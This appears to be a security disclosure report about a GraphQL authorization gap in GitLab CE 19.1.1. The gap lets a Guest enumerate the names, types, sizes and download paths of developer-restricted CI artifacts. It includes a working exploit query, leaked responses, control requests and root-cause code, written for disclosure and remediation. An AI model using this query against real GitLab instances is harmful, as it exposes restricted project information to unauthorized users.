## Summary

`Types::Ci::PipelineType.job_artifacts` and `Types::Ci::JobType.artifacts` return `Ci::JobArtifact` nodes to any caller that can already see the parent pipeline / job, without applying the artifact-specific policy that GitLab enforces on every other artifact surface. `Types::Ci::JobArtifactType` explicitly disables `Graphql/AuthorizeTypes` and does not declare a `:read_job_artifacts` type-level authorize, and `Resolvers::Ci::PipelineJobArtifactsResolver#find_job_artifacts` returns `pl.job_artifacts` directly with no `Ability.allowed?(user, :read_job_artifacts, ...)` filter.

The result is that a user who is denied artifact access by `Ci::JobArtifactPolicy` (for example, a Guest on a project whose jobs use `artifacts: access: developer`, or a Reporter looking at Developer-only artifacts) can still enumerate the restricted artifact catalog through GraphQL: artifact `id`, `name`, `fileType`, `size`, `expired`, `expireAt`, and the generated `downloadPath`. The parallel REST controller (`Projects::ArtifactsController#download/browse/raw`) does correctly call `authorize_read_job_artifacts!`, which is why the leaked `downloadPath` still returns `404` when the same restricted user tries to fetch the file — the gate exists, it just wasn't applied to the GraphQL type/resolver.

Reproduced live on GitLab CE **19.1.1** with a Guest member enumerating an `artifacts: access: developer` archive on a private project, while the parallel REST download for that identical URL returns `404` for the same user and `200 + PK zip payload` for the project owner.

---

## Affected component

| Field | Value |
|---|---|
| GraphQL type (pipeline surface) | `Types::Ci::PipelineType.job_artifacts` (`app/graphql/types/ci/pipeline_type.rb:132`) |
| GraphQL type (job surface) | `Types::Ci::JobType.artifacts` (`app/graphql/types/ci/job_type.rb:70`) |
| Node type | `Types::Ci::JobArtifactType` (`app/graphql/types/ci/job_artifact_type.rb`) — has `graphql_name 'CiJobArtifact'` and **explicitly disables `Graphql/AuthorizeTypes`** with no `:read_job_artifacts` authorize |
| Resolver | `Resolvers::Ci::PipelineJobArtifactsResolver#find_job_artifacts` (`app/graphql/resolvers/ci/pipeline_job_artifacts_resolver.rb:20`) |
| Version confirmed | GitLab CE 19.1.1 |
| Required attacker permission | Any role that can `:read_pipeline` (Guest is sufficient on private projects; anonymous is sufficient on public projects with `public_builds=true`) |

Sibling code that **does** enforce the correct gate (this is the parity evidence):
- `Projects::ArtifactsController#download`, `#browse`, `#raw`, `#file`, `#external_file` all invoke `authorize_read_job_artifacts!` (`app/controllers/projects/artifacts_controller.rb`).
- REST API artifact endpoints under `lib/api/job_artifacts.rb` similarly authorize via `authorize! :read_job_artifacts, user_project`.
- `Ci::JobArtifactPolicy` (`app/policies/ci/job_artifact_policy.rb:40`) applies per-artifact `access` levels (`none`, `developer`, `maintainer`, `security-report`) on top of project `public_builds` and job-level `read_build`.

Neither `PipelineType.job_artifacts` nor `JobType.artifacts` nor `JobArtifactType` reference any of these.

Data flow:

```
GraphQL query
  → Project.pipelines(first:5)                # PipelineType: authorize :read_pipeline
    → jobArtifacts { ... }                    # PipelineJobArtifactsResolver
        pl.job_artifacts                      # NO :read_job_artifacts filter
      → JobArtifactType nodes                 # AuthorizeTypes DISABLED
    → jobs(first:5).nodes.artifacts { ... }   # JobType.artifacts (parent: :read_build only)
      → JobArtifactType nodes                 # same problem
```

---

## Steps to reproduce

Preconditions:
- Any GitLab project with at least one CI job that produces artifacts constrained by `artifacts: access: developer` (or `access: none`, or artifact types that `Ci::JobArtifactPolicy` restricts to specific roles / security-report readers).
- A user account with `:read_pipeline` on that project but without `:read_job_artifacts` on the restricted artifacts (Guest is the canonical case; Reporter also qualifies for `access: developer`).

For a self-contained reproduction from scratch, the attached `poc.py` creates a fresh private project owned by `root`, adds `user1` as a Guest, adds a `.gitlab-ci.yml` with `artifacts: access: developer`, registers a temporary project runner, runs one job through the runner-job-request API to produce a real archive artifact, and then performs the actual attacker action as `user1`.

Attacker-side request (single GraphQL call — this is the whole exploit once artifacts exist):

```http
POST /api/graphql HTTP/1.1
Host: <target>
Content-Type: application/json
Authorization: Bearer <guest-user-PAT-with-read_api>

{
  "query": "query($fullPath:ID!){project(fullPath:$fullPath){pipelines(first:5){nodes{id iid status jobArtifacts{id name fileType downloadPath size expired expireAt} jobs(first:5){nodes{id name status artifacts(first:5){nodes{id name fileType downloadPath size expired expireAt}}}}}}}}",
  "variables": { "fullPath": "<group>/<project>" }
}
```

Response (200 OK) exposes restricted-artifact catalog to the Guest:

```json
{
  "data": {"project": {"pipelines": {"nodes": [{
    "id": "gid://gitlab/Ci::Pipeline/N",
    "status": "SUCCESS",
    "jobArtifacts": [
      {
        "id": "gid://gitlab/Ci::JobArtifact/1",
        "name": "artifacts.zip",
        "fileType": "ARCHIVE",
        "downloadPath": "/root/tf-artmeta-1782965618/-/jobs/11/artifacts/download?file_type=archive",
        "size": "142",
        "expired": false
      },
      {
        "id": "gid://gitlab/Ci::JobArtifact/2",
        "name": "metadata.gz",
        "fileType": "METADATA",
        "downloadPath": "/root/tf-artmeta-1782965618/-/jobs/11/artifacts/download?file_type=metadata",
        "size": "153",
        "expired": false
      }
    ],
    "jobs": { "nodes": [{
      "id": "gid://gitlab/Ci::Build/11",
      "name": "restricted_artifact",
      "status": "SUCCESS",
      "artifacts": {"nodes": [ /* same two artifact nodes */ ]}
    }]}
  }]}}}
}
```

The confirming control request — same Guest, same URL from the leaked `downloadPath`:

```http
GET /root/tf-artmeta-1782965618/-/jobs/11/artifacts/download?file_type=archive HTTP/1.1
Cookie: <guest session>

→ HTTP/1.1 404 Not Found
```

And the owner performing the same GET as a sanity check:

```http
GET /root/tf-artmeta-1782965618/-/jobs/11/artifacts/download?file_type=archive HTTP/1.1
Cookie: <owner session>

→ HTTP/1.1 200 OK
   Content-Type: application/zip
   [PK\x03\x04 ... zip payload ...]
```

The two responses to the identical URL are the proof of the authorization gap: GraphQL and REST have diverged on the same policy question.

---

## Proof of concept

A self-contained script that creates the project, adds `user1` as Guest, runs a controlled CI job with a developer-only artifact, and then executes the Guest-side attack + REST-side control is attached (`poc.py`). Running it prints `PASS` and dumps the leaked artifact node plus both status codes.

```
$ python3 poc.py --base-url https://<target> --accounts workspace/_accounts.json

PASS: GraphQL exposed restricted artifact metadata while artifact download stayed blocked
project=root/tf-artmeta-poc-1782965618 job=11
graphql_archive={"downloadPath": "/root/tf-artmeta-poc-1782965618/-/jobs/11/artifacts/download?file_type=archive",
                 "expired": false, "fileType": "ARCHIVE", "id": "gid://gitlab/Ci::JobArtifact/1",
                 "name": "artifacts.zip", "size": "142"}
root_download_status=200 guest_download_status=404
```

The PASS condition is deliberately strict: the Guest must receive full metadata **and** the same URL must return 404/403 to the Guest while returning 200 with a PK zip payload to the owner. This eliminates the "maybe user1 actually has access" hypothesis.

## Root cause

Three code sites, each individually necessary and jointly sufficient to reproduce the bug:

1. **`Types::Ci::JobArtifactType` disables `Graphql/AuthorizeTypes`** and does not declare `:read_job_artifacts` at type level:

   ```ruby
   # app/graphql/types/ci/job_artifact_type.rb
   module Types
     module Ci
       # rubocop:disable Graphql/AuthorizeTypes
       class JobArtifactType < BaseObject
         graphql_name 'CiJobArtifact'
         # no `authorize :read_job_artifacts` — exposes id, name, file_type,
         # size, expire_at, expired, download_path
         ...
       end
       # rubocop:enable Graphql/AuthorizeTypes
     end
   end
   ```

2. **`Types::Ci::PipelineType.job_artifacts`** field is declared with only the parent pipeline's `:read_pipeline` gate:

   ```ruby
   # app/graphql/types/ci/pipeline_type.rb:132
   field :job_artifacts, Types::Ci::JobArtifactType.connection_type,
         null: true,
         description: 'Job artifacts of the pipeline.',
         resolver: Resolvers::Ci::PipelineJobArtifactsResolver
   ```

3. **`Resolvers::Ci::PipelineJobArtifactsResolver#find_job_artifacts`** returns `pl.job_artifacts` directly:

   ```ruby
   # app/graphql/resolvers/ci/pipeline_job_artifacts_resolver.rb:17-22
   def resolve(**_args)
     ...
     @loader = BatchLoader::GraphQL.for(object.id).batch(...) do |pipeline_ids, loader, args|
       pipelines = ::Ci::Pipeline.id_in(pipeline_ids).preload(:job_artifacts)
       pipelines.each { |pl| loader.call(pl.id, find_job_artifacts(pl)) }
     end
   end

   def find_job_artifacts(pl)
     pl.job_artifacts   # <-- no Ability.allowed? filter
   end
   ```

The equivalent REST path in `Projects::ArtifactsController` shows exactly what the missing gate looks like:

```ruby
before_action :authorize_read_job_artifacts!, only: %i[download browse file raw external_file]

def authorize_read_job_artifacts!
  return render_404 unless can?(current_user, :read_job_artifacts, build)
end
```

The same policy check should exist inside `PipelineJobArtifactsResolver#find_job_artifacts` (and inside the sibling `JobType.artifacts` resolution path), filtering the returned collection through `Ability.allowed?(current_user, :read_job_artifacts, artifact_or_job)`.

## Environment

- Target: GitLab CE 19.1.1, self-hosted
- Attacker account: `user1` with **Guest** role (access_level=10) on the target project
- Project setup: private project owned by `root`, `.gitlab-ci.yml` with a single job using `artifacts: access: developer`
- Runner: a temporary project runner registered by `root` for the sole purpose of producing the fixture artifact; unnecessary in any real environment where restricted-artifact jobs already run

## Impact

A user who is denied artifact access by `Ci::JobArtifactPolicy` can, without any additional privilege, enumerate through GraphQL:

- Every restricted artifact's **filename** (which frequently encodes what the artifact contains — `release-prod-v2.1.tar.gz`, `customer-data-export.csv`, `security-scan.sarif`, `terraform.tfstate`, `k8s-manifest.yaml`, `aws-deploy-key.enc`).
- Every restricted artifact's **`fileType`** (`ARCHIVE`, `METADATA`, `TRACE`, `JUNIT`, `DAST`, `SAST`, `CODEQUALITY`, `SECRET_DETECTION`, `CONTAINER_SCANNING`, `LSIF`, etc.). This alone leaks whether a project runs specific security scanners and whether those scanners produced output — an attacker who is a Guest on the project can determine that SAST / DAST / secret-detection reports exist, which is itself an intelligence signal about the project's security posture.
- Every restricted artifact's **`size`** (side-channel for whether builds succeeded, how large the output is, whether a scan reported many or few findings).
- Every restricted artifact's **`expireAt` / `expired`** (leaks retention policy and lets an attacker plan follow-up when a fresher artifact is produced).
- The **generated `downloadPath`** (useful for later re-check after any related permission bug is discovered, or if the artifact ACL is subsequently mis-changed).
- The full **CI job catalog structure** across pipelines the caller can already see — mapping which pipelines produced which restricted artifacts of which types.
